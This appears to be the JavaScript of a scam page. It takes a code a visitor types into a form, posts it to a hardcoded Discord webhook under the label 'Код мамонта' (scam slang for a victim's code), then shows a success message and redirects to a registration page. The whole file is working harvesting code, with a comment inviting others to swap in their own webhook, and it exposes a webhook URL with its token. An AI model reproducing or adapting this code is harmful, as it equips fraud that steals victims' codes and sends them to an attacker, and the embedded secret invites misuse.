document.getElementById('submitBtn').addEventListener('click', function() {
    const inviteCode = document.getElementById('inviteCode').value;
    if (inviteCode) {
        sendToDiscord(inviteCode);
    } else {
        showNotification('Пожалуйста, введите код!', 'error');
    }
});

function sendToDiscord(code) {
    const webhookURL = 'https://discordapp.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv'; // Замените на свой вебхук
    const payload = {
        content: `Код мамонта: ${code}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            showNotification('Код получен!', 'success'); // Показываем уведомление об успехе
            window.location.href = 'reg.html'; // Переход на страницу
        } else {
            showNotification('Не удалось отправить код.', 'error'); // Показываем уведомление об ошибке
        }
    })
    .catch(error => {
        console.error('Error:', error);
        showNotification('Произошла ошибка.', 'error'); // Показываем уведомление о сети
    });
}

// Функция для отображения уведомлений
function showNotification(message, type) {
    const notification = document.getElementById('notification'); // Элемент для уведомлений
    notification.textContent = message;
    notification.className = type; // Добавляем класс для стилизации
    notification.style.display = 'block'; // Показываем уведомление

    setTimeout(() => {
        notification.style.display = 'none'; // Скрываем уведомление через 3 секунды
    }, 3000);
}
